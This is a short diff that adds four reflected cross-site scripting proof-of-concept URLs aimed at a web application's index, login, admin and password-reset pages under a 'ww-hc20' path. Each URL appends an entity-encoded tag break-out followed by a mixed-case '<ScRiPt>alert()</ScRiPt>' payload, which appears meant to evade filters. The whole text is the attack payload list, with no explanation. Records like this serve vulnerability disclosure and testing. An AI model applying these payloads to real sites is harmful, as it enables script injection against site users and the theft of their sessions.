@@ -1,0 +1,8 @@
+http://www.example.com/ww-hc20/index.php/&gt;&#039;&gt;&lt;ScRiPt&gt;alert(213771818860)&lt;/ScRiPt&gt;
+ 
+http://www.example.com/ww-hc20/inc/login.php/&gt;&#039;&gt;&lt;ScRiPt&gt;alert(213771818860)&lt;/ScRiPt&gt;
+ 
+http://www.example.com/ww-hc20/admin/index.php/&gt;&#039;&gt;&lt;ScRiPt&gt;alert(213771818860)&lt;/ScRiPt&gt;
+ 
+http://www.example.com/ww-hc20/admin/forgot.php/&gt;&quot;&gt;&lt;ScRiPt&gt;alert(213771818860)&lt;/ScRiPt&gt;
+
